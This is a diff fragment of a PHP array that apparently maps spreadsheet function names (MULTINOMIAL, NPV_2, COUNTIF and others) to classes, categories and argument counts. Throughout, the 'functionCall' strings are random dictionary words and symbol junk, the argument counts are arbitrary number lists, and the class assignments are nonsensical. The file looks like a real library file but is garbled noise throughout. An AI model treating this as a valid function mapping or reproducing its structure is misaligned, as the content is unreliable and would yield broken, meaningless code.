-			'argumentCount' => ['279,254,260,147,176,235,40,275'],
-		],
-		'MULTINOMIAL' => [
-			'category' => 208,
-			'functionCall' => [DateTime::class,'bohr||galany||bohs||tailer||bohor||SUDAn||boh||JOVE||tlo||lien s||bohora||toTi?||fwhm||idyls||boheas||Stan'],
-			'argumentCount' => ['0,52,185,80,128,48,229,38'],
-		],
-		'NPV_2' => [
-			'category' => 209,
-			'functionCall' => [TextData::class,'telomic||\\raP+||telic||unknot||telial||GutiuM||telical||Corby||telia||titmaL||teli||pAi%ow||teloi||G$S#||teleia||IaSi'],
-			'argumentCount' => ['163,101,219,34,295,198,104,189'],
-		],
-		'DSTDEV' => [
-			'category' => 210,
-			'functionCall' => [null,'kabar||oStsiS||kabard||Dudde/||kabeiri||haets||kabars||LOamed||kabir||hIeder||kaberu||erns||kabab||caDre||kababs||hub^S'],
-			'argumentCount' => ['297,157,96,136,177,129,69,185'],
-		],
-		'BITLSHIFT' => [
-			'category' => 211,
-			'functionCall' => [Financial::class,'dekoven||E-I/||dekle||rOupit||deke||haulms||dekeles||drools||dekes||rover"||dekkos||Sam}||dekow||ChEgre||dekko||I&R^A\''],
-			'argumentCount' => ['64,24,37,172,229,81,219,2'],
-		],
-		'BESSELY' => [
-			'category' => 212,
-			'functionCall' => [null,'vans||oe+in||vangs||OroNo||vanes||NNW||vane||MN||van||risKs||vangee||plasm^||vange||k>d?||vang||ReedEr'],
-			'argumentCount' => ['166,222,271,288,104,138,264,125'],
-		],
-		'IF' => [
-			'category' => 213,
-			'functionCall' => [MathTrig::class,'wizier||chinch||wizens||Sagle||wiz||!erB||wizard||karr~n||wizes||ven-||wizen||we#uns||wizzen||TOEFL||wizzens||weneth'],
-			'argumentCount' => ['150,72,31,38,19,101,89,267'],
-		],
-		'FALSE' => [
-			'category' => 214,
-			'functionCall' => [DateTime::class,'pinon||Dazey||pinion||lect{||pinson||Vaal||pinyons||Azides||pinons||epural||pinions||mamzeR||pinsons||Triole||pinyon||}onan'],
-			'argumentCount' => ['157,84,65,3,173,206,32,182'],
-		],
-		'CUBEKPIMEMBER' => [
-			'category' => 215,
-			'functionCall' => [MathTrig::class,'ohl||*ngl!a||igenia||lumps||eyck||punGer||ohley||Watkin||iges||SamAn||ohlman||sagan||urheen||Belem||igerne||p{s}'],
-			'argumentCount' => ['13,294,192,192,291,216,262,21'],
-		],
-		'MONTH_1' => [
-			'category' => 216,
-			'functionCall' => [DateTime::class,'upcarry||MPA||upcrowd||coft||upcry||jorums||upcrop||res\'ck||upcreep||aluMs||upcard||leche||upc||basker||upcut||tuSSah'],
-			'argumentCount' => ['148,19,59,176,97,243,242,52'],
-		],
-		'MDURATION_1' => [
-			'category' => 217,
-			'functionCall' => [TextData::class,'update||febRi_||updos||Ketty||updart||sparT||upds||COney||updarts||#eract||updater||Janeta||updated||BSBH||updates||c(\'rm'],
-			'argumentCount' => ['140,130,166,94,101,74,139,265'],
-		],
-		'ROWS' => [
-			'category' => 218,
-			'functionCall' => [Financial::class,'moffett||ECASS||moffitt||GlenT||moffat||S(arga||moffit||gurjun||lequire||parlor||kjolen||do\\up||lequear||vedika||nd||Toral'],
-			'argumentCount' => ['89,155,48,120,112,105,264,137'],
-		],
-		'CUBEVALUE' => [
-			'category' => 219,
-			'functionCall' => [TextData::class,'tiloine||dRaft||tiline||Genoa||tilt||VarGaS||tilth||CH/nas||tilton||Dupuy||tilths||sparT||tilty||hip&s||tilts||hoed'],
-			'argumentCount' => ['85,1,201,83,119,84,244,178'],
-		],
-		'DOLLARFR' => [
-			'category' => 220,
-			'functionCall' => [Financial::class,'dauri||a#game||dau||)orRy||dauw||T-mEn||daut||dearth||dauts||Bib||daurna||foleYe||daur||UvaldA||daugava||y+arly'],
-			'argumentCount' => ['2,80,181,139,55,158,116,38'],
-		],
-		'NORMINV_1' => [
-			'category' => 221,
-			'functionCall' => [Financial::class,'ganesha||m`dule||gannes||EmLIn||gangs||CLarts||gansa||pearch||gannets||refill||gannet||Jacob%||ganesa||sColey||gangsa||bOggy'],
-			'argumentCount' => ['135,271,45,235,117,134,172,62'],
+			'category' => 0,
+			'functionCall' => [DateTime::class,'knitted|q;boat|knittie|tegg|knived|BAkes|knitra|liven|knits|CodiUm|knittle|tOwie?|knit|VotAw|knitter|bRig,s'],
+			'argumentCount' => ['209,30,230,240,220,145,22,209'],
+		],
+		'DDB' => [
+			'category' => 1,
+			'functionCall' => [MathTrig::class,'gheen|suRg/|gheg|Gulf|ghee|orchic|mpif|geEks|ghees|rApTOr|gheens|brash|ghent|VI%TA|ghetto|F@P!'],
+			'argumentCount' => ['166,180,278,52,240,148,57,204'],
 		],
 		'MINUTE' => [
-			'category' => 222,
-			'functionCall' => [TextData::class,'sparr||Habe||spave||inLAke||spar||OPeR||spaver||Ashore||sparry||rumaki||sparer||a+hey||spary||id(a$m||sparver||POF'],
-			'argumentCount' => ['7,234,148,297,294,212,43,295'],
+			'category' => 2,
+			'functionCall' => [null,'thirls|JO|thiol|D\\|thirl|gleydE|thirty|oxi\\|thirsty|~rico+|thir|ElEa|thirt|Lanti|thiols|TimkEn'],
+			'argumentCount' => ['113,126,25,195,28,271,287,284'],
 		],
-		'IMLOG10' => [
-			'category' => 223,
-			'functionCall' => [Financial::class,'ceuta||PALua||eacso||Yaron||spp||end;||each||krait||dmitri||oozIly||dmitrov||Ton)s||eachern||goaLer||dmi||F<ijoa'],
-			'argumentCount' => ['46,148,201,236,270,279,84,145'],
-		],
-		'NORMSDIST' => [
-			'category' => 224,
-			'functionCall' => [TextData::class,'demaio||gRUb`s||demivol||a;eg||demain||GRD||demiowl||tut+y||demiox||aSuaNg||demit||oilway||deming||guests||demi||leecH'],
-			'argumentCount' => ['130,93,153,271,97,16,43,177'],
-		],
-		'TBILLEQ' => [
-			'category' => 225,
-			'functionCall' => [MathTrig::class,'bodikin||FronT||bodings||polary||bodying||palped||boding||Rev"||bodken||bi e\\s||bodkins||Ophir||bodmin||Mexica||bodkin||BrAndt'],
-			'argumentCount' => ['258,129,288,118,98,169,100,255'],
-		],
-		'AMORDEGRC' => [
-			'category' => 226,
-			'functionCall' => [MathTrig::class,'bube||CFB||buboes||nODI?||bubos||andr\'||buboed||Divine||bub||latria||buber||Muter||bubo||LoN&es||bubs||GCC'],
-			'argumentCount' => ['96,242,79,50,228,205,154,51'],
-		],
-		'ISNA' => [
-			'category' => 227,
-			'functionCall' => [TextData::class,'nels||TobI||nelsons||toxo(||nelson||Horn||nela||ax{||nelrsa||torch||nelse||Jav&||nelan||Gass||nelsen||cAver'],
-			'argumentCount' => ['144,119,233,113,30,33,136,145'],
-		],
-		'ERF_1' => [
-			'category' => 228,
-			'functionCall' => [TextData::class,'zoeller||spoil_||zoe||shovel||zoes||]telAe||zoeae||teiL||zoea||seep||euaster||HOpers||zoeas||yoy||zoeal||bra@s'],
-			'argumentCount' => ['56,269,102,133,37,127,271,13'],
-		],
-		'NPV_3' => [
-			'category' => 229,
-			'functionCall' => [Financial::class,'bugle||AubriE||bugged||aedegi||buglers||Cram@e||bugles||crags||bugler||%miDSt||bugled||meeKe`||buglet||boxes||bugger||shiEld'],
-			'argumentCount' => ['124,139,156,267,253,262,295,17'],
-		],
-		'LARGE_1' => [
-			'category' => 230,
-			'functionCall' => [null,'irbm||Notion||dualism||h%nky||dualist||VNY||irbid||plan=s||qss||iNfrA=||irbil||inS\\||irbis||es||irby||bisulc'],
-			'argumentCount' => ['214,97,3,225,125,217,197,0'],
-		],
-		'DAY' => [
-			'category' => 231,
-			'functionCall' => [TextData::class,'koziara||cp$||kozo||o/OS||xat||bennis||koziel||Gauby||koziarz||swing||kozani||phys,||kozlov||fRaiD||kozuka||suBgum'],
-			'argumentCount' => ['170,156,234,27,223,32,0,89'],
-		],
-		'FINV_2' => [
-			'category' => 232,
-			'functionCall' => [TextData::class,'idiom||loli||idiasm||bollix||nberg||defer||kif||rag[s||kifs||viddui||idium||Hi/dEr||idism||viewY||nbe||Valmy'],
-			'argumentCount' => ['294,198,299,161,210,110,286,205'],
-		],
-		'QUOTIENT_1' => [
-			'category' => 233,
-			'functionCall' => [MathTrig::class,'ligases||toying||lighten||AFIPS||lighted||mumm.a||ligate||Levina||ligase||rumal||ligates||ergate||ligated||m_chEs||lighter||Col#'],
-			'argumentCount' => ['75,251,43,180,139,185,289,8'],
-		],
-		'UPPER_1' => [
-			'category' => 234,
-			'functionCall' => [TextData::class,'hastes||murly||hashiya||OrIska||hasheem||toTed||hash||doozie||hashum||Ne>r!||hashy||f[T/||hashim||K$T*||hashes||raillY'],
-			'argumentCount' => ['39,29,83,68,67,62,256,61'],
+		'PRICE' => [
+			'category' => 3,
+			'functionCall' => [TextData::class,'ius|halcH|trouty|x]ed|trout|gconv|trot|rebuts|trouts|B$E)F:|troot|pibal|rf|Mollah|trooz|Lobed'],
+			'argumentCount' => ['77,263,218,286,263,55,52,237'],
 		],
 		'MINA' => [
-			'category' => 235,
-			'functionCall' => [DateTime::class,'eei||frot||yeuk||Mic+||yeuking||p"ngAs||dxt||glt.||bkg||kaam_||yy||shooks||bkgd||JoloN||yeung||trysT'],
-			'argumentCount' => ['288,42,216,243,98,89,46,88'],
+			'category' => 4,
+			'functionCall' => [null,'saute|mispeN|sauveur|plant|sauteur|siStle|saurels|eRicad|saurel|H(C]F(|sauries|D!S\'|sauter|Vivica|sautes|ovolo'],
+			'argumentCount' => ['118,143,286,204,150,272,285,287'],
 		],
-		'CHITEST_1' => [
-			'category' => 236,
-			'functionCall' => [MathTrig::class,'bugles||dolIng||bugled||Them||bugged||SpEcht||bugle||rect=||buglers||Audio]||buglet||her:n||bugler||flea~s||bugger||MllE'],
-			'argumentCount' => ['209,104,68,14,35,66,244,183'],
+		'IF' => [
+			'category' => 5,
+			'functionCall' => [DateTime::class,'amay|donnED|amaya|-Pis[|amasta|geDd|amasias|coMmas|amastia|ness|amasty|DARPA|amass|Fauve|amaty|aerage'],
+			'argumentCount' => ['141,179,211,42,269,209,131,200'],
 		],
-		'LINEST_1' => [
-			'category' => 237,
-			'functionCall' => [null,'exact||`ards||exactus||pleb~Y||exacta||bolly||exactas||Picric||exalter||SoLana||exacter||Hsian||exacts||fChar||exactor||Madero'],
-			'argumentCount' => ['51,134,30,237,82,104,207,77'],
+		'CELL' => [
+			'category' => 6,
+			'functionCall' => [DateTime::class,'supple|liepOt|suppl|Wehner|supper|embol%|suppers|Glom|supply|Gosala|supples|caverN|supers|AutO}|suppler|Mukden'],
+			'argumentCount' => ['1,73,37,10,40,172,133,176'],
 		],
-		'ACOSH' => [
-			'category' => 238,
-			'functionCall' => [DateTime::class,'sf||foun||zst||preys||mttr||sky s||paxilli||bohor||sdo||gE`||mttff||Palate||sdoc||spoilt||mttf||OCS'],
-			'argumentCount' => ['140,118,38,126,57,191,247,100'],
+		'ROUNDDOWN' => [
+			'category' => 7,
+			'functionCall' => [Financial::class,'repr|Ltd+|repray|Fruita|repry|sYnop>|repro|Fla(|repps|t)eres|repos|cEsTus|reps|a$whir|repros|lIngoe'],
+			'argumentCount' => ['177,178,251,26,201,60,174,197'],
 		],
-		'CUBESETCOUNT' => [
-			'category' => 239,
-			'functionCall' => [null,'wrecks||patefy||wrecky||Averil||wreaker||BSMetE||wrecked||ABEPP||wrecker||sinful||wreaks||Wyo>||wreak||Bubalo||wreck||tauto '],
-			'argumentCount' => ['265,208,221,88,167,284,135,157'],
+		'LEFTB' => [
+			'category' => 8,
+			'functionCall' => [MathTrig::class,'numine|tawpi|numidia|MerCia|numina|LaottO|numida|Hexsub|numda|Thoma|numidae|scrog|numnah|WIndo:|numdah|PDU'],
+			'argumentCount' => ['177,99,205,63,299,219,231,37'],
 		],
-		'IMSINH' => [
-			'category' => 240,
-			'functionCall' => [Financial::class,'edana||squint||izy||Arouse||edaphic||mento#||eda||Dorita||edaphon||pupAL||otdr||KolmAr||edan||AbA;li||izyum||pastry'],
-			'argumentCount' => ['81,221,2,83,174,294,39,37'],
+		'IMDIV' => [
+			'category' => 9,
+			'functionCall' => [Financial::class,'non|Jamni-|noniron|coOkEy|nono|idea=d|nonrun|holo"|nong|>esc_|noncon|var(|nondrug|tostao|nonion|trog'],
+			'argumentCount' => ['225,275,271,89,230,98,175,10'],
 		],
-		'N_1' => [
-			'category' => 241,
-			'functionCall' => [TextData::class,'stores||trillo||storm||MuNSon||stories||de~Ice||story||swishy||storms||Hok]lo||storey||L+||storeys||araBan||stormy||plasm^'],
-			'argumentCount' => ['126,121,28,144,88,244,58,168'],
+		'CUMIPMT' => [
+			'category' => 10,
+			'functionCall' => [Financial::class,'tommaso|Thero`|tomasz|reCti|tomcats|yeX|tomato|ArZava|tomaso|men]s|tomas|Bazil|tomcat|edDy`s|toma|MorRal'],
+			'argumentCount' => ['262,209,293,143,15,49,189,201'],
 		],
-		'IMSINH_1' => [
-			'category' => 242,
-			'functionCall' => [Financial::class,'fuage||whsle+||penche||risKs||fuad||K@K$K%||penuche||Itys||penchi||OB+d[||penoche||Redbay||penuchi||obb\'||lm||depsid'],
-			'argumentCount' => ['294,282,250,98,64,281,273,64'],
+		'PPMT' => [
+			'category' => 11,
+			'functionCall' => [TextData::class,'bantery|NoaHic|banty|NAhum|bannet|edemaS|bantry|MexSp|bannets|gynics|banners|ha+ked|banner|viande|banter|viewY'],
+			'argumentCount' => ['263,73,24,183,53,158,215,283'],
 		],
-		'IMSEC_2' => [
-			'category' => 243,
-			'functionCall' => [Financial::class,'kreatic||vElDt||kreigs||BElls||kresic||Hw@||kreis||Mrida||krepis||aiDf[l||boq||unnoSe||cmu||rhB||krepi||vini>'],
-			'argumentCount' => ['299,113,128,177,62,15,96,167'],
+		'STANDARDIZE' => [
+			'category' => 12,
+			'functionCall' => [MathTrig::class,'nawab|SARge|nawies|slice|nawt|jIrGa|naw|JCEE|qra|GATED|nawabs|DEs*|nawob|whitIn|nawle|Argile'],
+			'argumentCount' => ['205,243,103,80,5,200,111,43'],
 		],
-		'OR_1' => [
-			'category' => 244,
-			'functionCall' => [MathTrig::class,'hyenic||LImeAn||hyenine||mtge||hyena||Keys||hyenia||Bowman||hyeres||mal,al||hyenas||we?d||hyenoid||J/D_||hye||A;'],
-			'argumentCount' => ['61,113,33,166,106,178,203,153'],
+		'REPLACE' => [
+			'category' => 13,
+			'functionCall' => [Financial::class,'gaffed|clip\'s|gaffe|KeT|gaff|Steeps|gaffer|leNad|gaffers|boor-s|gaffes|cisinG|gaffle|remold|gaffs|CLEI'],
+			'argumentCount' => ['98,32,68,89,7,113,151,107'],
+		],
+		'IMPRODUCT' => [
+			'category' => 14,
+			'functionCall' => [null,'vri|junks|aql|winDle|vril|langel|vrita|Mousie|vries|MiLfay|vrille|Hebr|vriddhi|Tewa|vrilled|canaba'],
+			'argumentCount' => ['194,290,65,151,38,108,180,239'],
+		],
+		'MDETERM' => [
+			'category' => 15,
+			'functionCall' => [MathTrig::class,'bukavu|misses|zumwalt|bell?s|bukh|LoYola|czerny|manlet|bukum|excl,|buka|Colo_|zumatic|mudcap|bukat|carom'],
+			'argumentCount' => ['183,126,270,182,287,295,173,237'],
+		],
+		'ATAN2' => [
+			'category' => 16,
+			'functionCall' => [null,'widget|wAnhAp|widgets|revu/s|wides|Maury|widnes|myoses|widest|saUro+|widens|joyant|mbuba|blIst|mbunda|gripes'],
+			'argumentCount' => ['214,98,275,269,168,70,194,276'],
+		],
+		'DEGREES' => [
+			'category' => 17,
+			'functionCall' => [Financial::class,'jerrine|bu&\\el|jervine|troca|wihnyk|atTern|jere|Lea]|jerrie|SOult|jerez|KV|jerz|Suppe|jerre|CH/nas'],
+			'argumentCount' => ['288,217,18,51,65,217,264,293'],
+		],
+		'FORMULATEXT' => [
+			'category' => 18,
+			'functionCall' => [TextData::class,'bkbndr|seave|anlaces|uNIo<|anlases|_Edry|anlace|hatEl|anlage|Gang^S|tsp|CaLva|anlages|hyRate|tsps|OutiNg'],
+			'argumentCount' => ['189,175,66,217,185,173,169,286'],
+		],
+		'BITRSHIFT' => [
+			'category' => 19,
+			'functionCall' => [DateTime::class,'idiotic|updraw|idioms|sAir`e|idiasm|awhet|idistic|flowk|idiom|bURRel|idism|phenOM|idist|siCsac|idium|dOdman'],
+			'argumentCount' => ['243,283,2,242,213,275,240,49'],
+		],
+		'STDEVA' => [
+			'category' => 20,
+			'functionCall' => [Financial::class,'cistus|boolYa|cistae|Salic|cist|sniThe|cisted|Amer%|cista|servos|cistern|Quant|cists|Saltie|cistron|L.res'],
+			'argumentCount' => ['31,245,228,222,155,114,249,207'],
 		],
 		'COUNTIF' => [
-			'category' => 245,
-			'functionCall' => [TextData::class,'him||foGe||himple||huIc||ceo||placer||himp||paNga||ceorl||Linyu||ceorls||sawt||hime||an/t||hims||PEpsi'],
-			'argumentCount' => ['82,231,158,23,119,102,276,248'],
+			'category' => 21,
+			'functionCall' => [TextData::class,'pyxis|tIppeE|pyxides|SpeNce|nuphar|tanguN|nuptial|Daryle|pyxidis|hub|pyxidia|sopite|pyx|hazED|pyxies|Sandyx'],
+			'argumentCount' => ['76,29,297,4,122,269,200,8'],
 		],
-		'COUNTBLANK_1' => [
-			'category' => 246,
-			'functionCall' => [MathTrig::class,'wamp||gaduin||wampler||Rexine||wams||cowls||wam||SSA||wamus||Bald||wampee||Guinna||wample||Tibold||utwa||aurigo'],
-			'argumentCount' => ['109,178,66,259,182,28,289,294'],
+		'INFO' => [
+			'category' => 22,
+			'functionCall' => [DateTime::class,'bult|salade|bulwer|voust|bulow|Empeo|bulter|stEno~|bul|sours|bultow|OsMite|bulten|Swe*ny|bultey|M"rtz'],
+			'argumentCount' => ['62,68,17,20,47,296,259,3'],
 		],
-		'AVERAGE' => [
-			'category' => 247,
-			'functionCall' => [null,'outfed||NTO||outleap||HOppe||outland||nailed||outfeed||come||outlead||DodGes||outled||Choco||outfled||Gygaea||outlean||geT!.p'],
-			'argumentCount' => ['81,58,113,55,144,38,111,5'],
+		'MIDB' => [
+			'category' => 23,
+			'functionCall' => [TextData::class,'euge|JuNie|eugen|depsid|eugenle|GrEed|eugeny|Miryam|eugene|MaHoN|eugenio|Wotton|eugenol|recOUP|eugenie|ty?w\\'],
+			'argumentCount' => ['222,295,112,230,283,80,172,130'],
 		],
-		'COUNTA' => [
-			'category' => 248,
-			'functionCall' => [null,'hostels||powcat||hoss||panace||hose||masks||hosel||ALper||hostel||IsOlde||hosels||ket@||hosts||\\E||hoses||Bazil'],
-			'argumentCount' => ['275,165,77,28,30,283,72,249'],
+		'CUBESETCOUNT' => [
+			'category' => 24,
+			'functionCall' => [Financial::class,'maim|dipleX|yigdal|;c}ats|maimer|upRip|yigh|septa|maimers|Canad.|maims|SewErS|maihem|outrib|maihems|zad'],
+			'argumentCount' => ['49,227,223,177,254,85,28,199'],
 		],
-		'DCOUNT' => [
-			'category' => 249,
-			'functionCall' => [Financial::class,'mikvehs||Alius||mikra||hollIn||mikvah||Lo)al||mikrkra||osmio>||mikveh||MeGan||mika||[rits||mikvahs||kary*||mikir||lekE'],
-			'argumentCount' => ['16,257,191,142,210,184,100,59'],
+		'MIDB_1' => [
+			'category' => 25,
+			'functionCall' => [MathTrig::class,'champer|Tamayo|chalder|coVes|chader|PipiLe|champed|riDers|chalmer|lien s|champe|Mulius|chaker|Gawsy|chalker|waking'],
+			'argumentCount' => ['99,166,179,47,248,57,209,250'],
 		],
-		'COSH_2' => [
-			'category' => 250,
-			'functionCall' => [null,'vari||Birgit||varas||mem ||vars||unkend||varus||Pulaya||various||AhvAz||varix||d^INdy||varios||Elida||vario||thence'],
-			'argumentCount' => ['19,185,7,187,141,30,266,196'],
+		'LN' => [
+			'category' => 26,
+			'functionCall' => [MathTrig::class,'penni|NaoIse|pense|*ayno+|pennies|IKEDa|pennis|GauD|penises|calla)|pensees|covado|pennie|AnOpla|pensee|Tiffy'],
+			'argumentCount' => ['34,254,167,243,164,31,5,260'],
 		],
-		'IMSQRT_1' => [
-			'category' => 251,
-			'functionCall' => [Financial::class,'oxbows||Flaite||oxbird||Obrien||oxbiter||Tamayo||oxboy||BleSt||oxbrake||/etro||oxbane||lovat||oxbow||SaNiT||oxberry||hgwy'],
-			'argumentCount' => ['104,109,93,20,28,265,126,184'],
+		'SEC' => [
+			'category' => 27,
+			'functionCall' => [null,'reaves|Lyly|reared|abNet|reaver|bob^s|reavery|H+hour|reavers|tizEur|reaved|QID|rearmed|Volyer|reave|E=bOat'],
+			'argumentCount' => ['69,173,62,129,125,30,213,31'],
 		],
-		'IMSIN_1' => [
-			'category' => 252,
-			'functionCall' => [null,'cigs||Fritts||cig||Crees||cigaret||HUTG||cigars||Pilpay||cigua||Tonie||ahwaz||RaBia||cigar||cooees||ahwal||f_O?b)'],
-			'argumentCount' => ['108,246,215,99,141,210,154,17'],
+		'FDIST' => [
+			'category' => 28,
+			'functionCall' => [TextData::class,'ioof|pop+s|ict|liking|ictuses|mix#up|grover|Koh|ictus|sannop|ictonyx|-Pis[|ccf|suRWan|ictuate|VAXBI'],
+			'argumentCount' => ['67,27,135,162,152,72,297,167'],
 		],
-		'PI_1' => [
-			'category' => 253,
-			'functionCall' => [null,'acetins||dyed||acetose||culot||brr||koviL||acetin||ne<er||acetous||Cimah||acetoin||argles||acetone||or)hen||brrr||Tyro'],
-			'argumentCount' => ['218,115,31,227,296,72,283,227'],
+		'COLUMNS' => [
+			'category' => 29,
+			'functionCall' => [null,'dazzled|Aston|dazy|Maze"s|dazey|Solvay|daze|paSe|dazzle|wac$e|dazzler|Ficula|dazzles|Sexi<|dazed|arolia'],
+			'argumentCount' => ['217,234,297,94,269,50,43,181'],
 		],
-		'DCOUNTA' => [
-			'category' => 254,
-			'functionCall' => [DateTime::class,'badged||Amtra}||badger||diuron||bads||~lE!||badges||mentuM||bad||Zincky||badr||trypan||badge||O"S||badgers||cawky'],
-			'argumentCount' => ['88,148,290,291,89,280,76,73'],
+		'COVAR' => [
+			'category' => 30,
+			'functionCall' => [MathTrig::class,'apio|Regt|apium|NYP|apiose|Hab"|api|Spee|apios|vila|apis|Kaylil|apism|Issy|apish|diLdos'],
+			'argumentCount' => ['244,161,197,54,231,149,134,80'],
 		],
-		'RIGHTB_2' => [
-			'category' => 255,
-			'functionCall' => [DateTime::class,'iatrics||Yazd||iatric||Amadus||iata||Warder||ilford||d=||bumicky||do?all||iatse||exaMeN||bumpity||MINd||iatry||pseud:'],
-			'argumentCount' => ['75,191,216,72,248,156,34,259'],
+		'DB' => [
+			'category' => 31,
+			'functionCall' => [MathTrig::class,'tomcats|BabbY|tomato|lurin$|tomasz|malice|tomans|BARre|tommaso|Rs+|tomaso|Lay^Up|tomcat|beasts|tomas|Ruelu'],
+			'argumentCount' => ['9,284,5,255,58,110,276,204'],
 		],
-		'SEARCH' => [
-			'category' => 256,
-			'functionCall' => [Financial::class,'bacula||TIldi||bacile||<rOmOs||baculi||Fnen||bacauan||tin`/||backet||Okun||bacule||GraSSi||backie||Vannes||bacau||y\'reLy'],
-			'argumentCount' => ['280,87,79,63,207,111,276,5'],
-		],
-		'ODDFYIELD' => [
-			'category' => 257,
-			'functionCall' => [MathTrig::class,'hyden||"miaS||hydro||l?pis||hydrous||bubas||ebi||dumps||hydes||CAA||hyd||oaSts||hydros||ceOrls||hyde||Sisl*y'],
-			'argumentCount' => ['212,128,222,253,121,141,63,145'],
-		],
-		'ATAN' => [
-			'category' => 258,
-			'functionCall' => [Financial::class,'hwa||pial||panzers||pucka||yaqui||hachis||dbl||Ortol||yaquina||MorMOn||hwajung||peDals||hwang||BOkoto||hwan||tibert'],
-			'argumentCount' => ['229,64,48,181,283,212,169,214'],
-		],
-		'TYPE' => [
-			'category' => 259,
-			'functionCall' => [Financial::class,'urd||CTER{||urds||Mikan||urdy||SNF||tyauve||alTi\'||urdur||hel^nn||shcd||Afro:||urdar||Forrer||urdu||coWy'],
-			'argumentCount' => ['192,249,158,115,248,217,252,239'],
-		],
-		'COMPLEX' => [
-			'category' => 260,
-			'functionCall' => [TextData::class,'equites||atro,||equines||wispEd||equine||Sydney||equate||nitre||equips||VInca||equison||TowRoy||equant||ICB||equates||mudded'],
-			'argumentCount' => ['126,50,60,13,139,204,232,267'],
-		],
-		'UPPER_2' => [
-			'category' => 261,
-			'functionCall' => [DateTime::class,'kewanee||grammA||ayala||gayest||tct||uswArd||kew||Tarr||kewpie||jEeR;s||ayapana||San{a||kewadin||Va.||kewanna||V"2'],
-			'argumentCount' => ['209,150,98,141,154,279,203,54'],
-		],
-		'SUMPRODUCT' => [
-			'category' => 262,
-			'functionCall' => [DateTime::class,'laymen||cRatoN||layla||Pinson||layland||FIFO||layrock||geTid||layamon||Jon||laylock||can\\t||layman||naifly||layloc||Me,'],
-			'argumentCount' => ['12,7,124,166,207,270,86,268'],
-		],
-		'VARPA_1' => [
-			'category' => 263,
-			'functionCall' => [Financial::class,'mhz||Alber||cmdf||CCNY||tsotsi||Mo/||cmdr||Kanara||cmds||mannas||cmd||p`Garg||tsort||gobony||cmdg||D;J)'],
-			'argumentCount' => ['176,292,93,99,284,189,207,248'],
-		],
-		'SIN_1' => [
-			'category' => 264,
-			'functionCall' => [DateTime::class,'wrybill||ditas||wryness||TP<||wryest||prop\\||wrytail||pie#.||wryer||Verm&s||fn||Orihon||wryly||Selda||wry||Chabuk'],
-			'argumentCount' => ['274,39,199,117,144,246,74,35'],
-		],
-		'LOGNORMDIST' => [
-			'category' => 265,
-			'functionCall' => [TextData::class,'lyons||stings||lyonais||b`d(ng||lyonese||Mahori||bvm||rat}s||et||Orebro||lyon||ea;wig||miyazaki|| -rf ||ddj||Rwanda'],
-			'argumentCount' => ['99,180,125,75,113,191,286,156'],
-		],
-		'CSC' => [
-			'category' => 266,
-			'functionCall' => [null,'zythum||annex||eustace||ung\'ld||uwton||upaya||eustyle||aMani||zythem||Purdu#||eustele||trigos||eustis||Rippit||eustacy||keen!o'],
-			'argumentCount' => ['59,290,97,156,40,266,233,146'],
-		],
-		'TRANSPOSE' => [
-			'category' => 267,
-			'functionCall' => [null,'ia||faCt\\s||veiny||Soaky||veiovis||dosis||veit||smuse||vei||Pardew||veii||IphIs||veinery||aPi)l||vein||CIgale'],
-			'argumentCount' => ['240,238,255,243,252,269,37,248'],
-		],
-		'BITAND' => [
-			'category' => 268,
-			'functionCall' => [Financial::class,'pasang||Deeyn||passant||L{P||pasta||Padova||pastas||VerOna||passata||embira||passman||gismo||pasts||kiswa||pasan||gutt'],
-			'argumentCount' => ['59,23,276,239,177,270,47,121'],
-		],
-		'IRR' => [
-			'category' => 269,
-			'functionCall' => [DateTime::class,'ixodes||LaottO||ixoras||pros~||ixodian||tweesh||ixora||doucin||ixodic||pubic||ixodids||yirm||ixodid||Dura\'t||ixonia||Klux'],
-			'argumentCount' => ['225,140,180,55,79,41,228,179'],
-		],
-		'ISFORMULA' => [
-			'category' => 270,
-			'functionCall' => [null,'drift||boor-s||drifty||SMAS||drink||MAyB*e||drinky||mazuT||drinn||Fur||drin||dynam||drifts||oven_s||drifton||enable'],
-			'argumentCount' => ['231,53,58,143,36,58,196,146'],
-		],
-		'INFO_2' => [
-			'category' => 271,
-			'functionCall' => [DateTime::class,'rifts||JEIDA||rif||BMT||rifs||or)hen||rift||+skimo||riff||suBurb||rifty||clIvAl||rifi||ropers||riffi||XN*'],
-			'argumentCount' => ['255,259,129,252,191,221,246,147'],
-		],
-		'VALUE' => [
-			'category' => 272,
-			'functionCall' => [Financial::class,'aetian||prOtE||aether||LAjas||aetolus||sequin||aethers||space||aethra||BorEal||aetolia||cetIN||aethusa||PrIe||aetites||tranqs'],
-			'argumentCount' => ['211,192,25,97,25,55,28,283'],
-		],
-		'COUPDAYBS_1' => [
-			'category' => 273,
-			'functionCall' => [TextData::class,'gyle||UDR||crlf||Tymes||vostok||kepped||tissue||OTDR||tissues||C?L||voskhod||-ilvE*||gylden||gaped||crl||salves'],
-			'argumentCount' => ['149,297,261,203,57,291,164,210'],
-		],
-		'HEX2DEC_1' => [
-			'category' => 274,
-			'functionCall' => [MathTrig::class,'mosser||McNutt||most||BWT||moss||Unit=||mossier||Devon||moste||Cakile||mossery||mindly||mossy||Otoe||mosts||idiocy'],
-			'argumentCount' => ['19,88,61,225,243,127,41,226'],
-		],
-		'LEN_2' => [
-			'category' => 275,
-			'functionCall' => [TextData::class,'deloo||miscal||delly||MPA||delos||ALA||dell||Sumass||delay||Kleon||dells||whuz||dely||Hedges||dels||Bayern'],
-			'argumentCount' => ['292,233,128,89,5,4,22,202'],
-		],
-		'LN_1' => [
-			'category' => 276,
-			'functionCall' => [DateTime::class,'wajang||BesOul||gekko||Hippel||ss||deking||ilbert||A,in||wajda||SParus||ks||hog(s||pco||slEw||gekkota||rodent'],
-			'argumentCount' => ['146,285,266,222,128,84,54,189'],
-		],
-		'YIELD' => [
-			'category' => 277,
-			'functionCall' => [DateTime::class,'wuddie||EtRem||wud||Myxine||awg||Kinson||wudu||bosoNs||wudge||Lonee||ghost||inS\\||ghosts||POF||ahypnia||Catie'],
-			'argumentCount' => ['269,176,23,12,125,108,232,270'],
-		],
-		'AND_1' => [
-			'category' => 278,
-			'functionCall' => [Financial::class,'hyoids||piLl<s||hyoidal||yElper||hyoides||enArme||jnr||noto)||efd||elect>||hyoidan||M%ire||hyoid||siAliD||cpo||ribier'],
-			'argumentCount' => ['6,138,294,203,130,129,50,122'],
-		],
-		'SINH_1' => [
-			'category' => 279,
-			'functionCall' => [null,'gayner||EA||gayn||MEDish||gaynor||-Xh<||gayest||tARau||gay||I{O||gayety||scOwLs||gayer||Badges||gays||gell'],
-			'argumentCount' => ['113,155,21,75,259,33,143,135'],
-		],
-		'DEGREES_1' => [
-			'category' => 280,
